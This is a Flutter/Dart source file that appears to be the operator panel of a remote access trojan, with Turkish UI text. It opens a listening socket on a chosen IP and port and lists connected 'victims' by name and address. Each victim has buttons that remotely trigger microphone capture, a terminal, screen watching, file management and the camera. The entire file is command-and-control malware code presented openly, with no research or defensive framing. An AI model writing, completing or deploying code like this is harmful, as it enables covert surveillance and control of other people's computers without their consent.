import 'package:flutter/material.dart';
import 'package:flutter_riverpod/flutter_riverpod.dart';
import 'package:flutter_screenutil/flutter_screenutil.dart';
import 'package:panel/core/cache/locale_manager.dart';
import 'package:panel/core/providers/main_sockets.dart';
import 'package:panel/product/enums/locale_enums.dart';
import 'package:panel/product/models/victim_model.dart';
import 'package:panel/view/home/viewmodel/home_viewmodel.dart';

class HomeView extends ConsumerStatefulWidget {
  const HomeView({Key? key}) : super(key: key);

  @override
  ConsumerState<ConsumerStatefulWidget> createState() => _HomeViewState();
}

class _HomeViewState extends ConsumerState<HomeView> {
  late ChangeNotifierProvider<HomeViewModel> provider;

  @override
  void initState() {
    provider = ChangeNotifierProvider<HomeViewModel>((ref) => HomeViewModel());
    super.initState();
  }

  @override
  Widget build(BuildContext context) {
    ref
        .watch(serverSocketProvider)
        .victims
        .removeWhere((victim) => !victim.active);
    return Scaffold(
      body: ref.watch(serverSocketProvider).serverSocket == null
          ? _configForm()
          : _victimForm(),
    );
  }

  _configForm() {
    return Center(
      child: Container(
        decoration: BoxDecoration(
          color: Colors.white,
          borderRadius: BorderRadius.circular(10),
          border: Border.all(color: Colors.grey, width: 1),
        ),
        padding: const EdgeInsets.all(20),
        width: 0.5.sw,
        height: 0.5.sh,
        child: Form(
          child: Column(
            mainAxisAlignment: MainAxisAlignment.spaceEvenly,
            children: [
              TextFormField(
                  initialValue: LocaleManager.instance
                      .getString(LocaleEnum.defaultSocketIp),
                  onChanged: (value) {
                    LocaleManager.instance
                        .setString(LocaleEnum.defaultSocketIp, value);
                  },
                  decoration: const InputDecoration(labelText: "IP")),
              TextFormField(
                  initialValue: LocaleManager.instance
                      .getInt(LocaleEnum.defaultSocketPort)
                      .toString()
                      .replaceAll("null", ""),
                  decoration: const InputDecoration(labelText: "Port"),
                  onChanged: (value) {
                    LocaleManager.instance
                        .setInt(LocaleEnum.defaultSocketPort, int.parse(value));
                  }),
              ElevatedButton(
                  onPressed: () {
                    ref.read(serverSocketProvider).init();
                  },
                  child: const Text("Dinlemeye başla"))
            ],
          ),
        ),
      ),
    );
  }

  _victimForm() {
    return ListView.builder(
      itemCount: ref.watch(serverSocketProvider).victims.length,
      itemBuilder: (context, index) {
        VictimModel victim = ref.watch(serverSocketProvider).victims[index];
        return ListTile(
          title: Text("Victim: ${victim.name ?? "Henüz gelmedi"}"),
          subtitle: Text(
              "Victim ip: ${victim.soket.remoteAddress.address}\nPort: ${victim.soket.remotePort}"),
          trailing: Row(
            mainAxisSize: MainAxisSize.min,
            children: [
              IconButton(
                  icon: const Icon(Icons.keyboard_voice),
                  onPressed: () => victim.send("voice")),
              IconButton(
                  icon: const Icon(Icons.terminal),
                  onPressed: () => victim.send("terminal")),
              IconButton(
                  icon: const Icon(Icons.desktop_windows),
                  onPressed: () => victim.send("watch")),
              IconButton(
                  icon: const Icon(Icons.folder),
                  onPressed: () => victim.send("file_manager")),
              IconButton(
                  icon: const Icon(Icons.camera_alt),
                  onPressed: () => victim.send("camera")),
              IconButton(
                  icon: const Icon(Icons.cancel),
                  onPressed: () => victim.send("exit")),
              IconButton(
                  icon: const Icon(Icons.refresh),
                  onPressed: () => victim.send("refresh"))
            ],
          ),
        );
      },
    );
  }
}
